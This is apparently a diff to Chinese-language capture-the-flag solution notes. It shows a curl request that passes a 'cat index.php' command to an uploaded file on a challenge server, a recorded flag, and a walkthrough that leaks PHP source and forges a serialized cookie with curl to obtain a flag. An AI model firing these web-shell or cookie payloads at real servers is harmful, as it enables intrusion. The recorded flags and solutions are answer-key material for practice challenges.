@@ -1437,3 +1437,48 @@ curl -d "cmd=cat index.php" http://118.89.219.210:49166/index.php?file=upload/20
  用 mycurl.py python脚本 
  KEY{bb35dc123820e}
 
+ =======================
+ =======================
+用 http://120.24.86.145:8002/flagphp/?hint
+可以返回 php 源码
+<?php 
+error_reporting(0); 
+include_once("flag.php"); 
+$cookie = $_COOKIE['ISecer']; 
+if(isset($_GET['hint'])){ 
+    show_source(__FILE__); 
+} 
+elseif (unserialize($cookie) === "$KEY") 
+{    
+    echo "$flag"; 
+} 
+else { 
+?> 
+<html> 
+<head> 
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
+<title>Login</title> 
+<link rel="stylesheet" href="admin.css" type="text/css"> 
+</head> 
+<body> 
+<br> 
+<div class="container" align="center"> 
+  <form method="POST" action="#"> 
+    <p><input name="user" type="text" placeholder="Username"></p> 
+    <p><input name="password" type="password" placeholder="Password"></p> 
+    <p><input value="Login" type="button"/></p> 
+  </form> 
+</div> 
+</body> 
+</html> 
+} 
+$KEY='ISecer:www.isecer.com'; 
+?>
+
+
+
+
+ $returnValue = serialize('ISecer:www.isecer.com');
+ s:21:"ISecer:www.isecer.com";
+
+curl --cookie "ISecer=s:21:"ISecer:www.isecer.com""  http://120.24.86.145:8002/flagphp
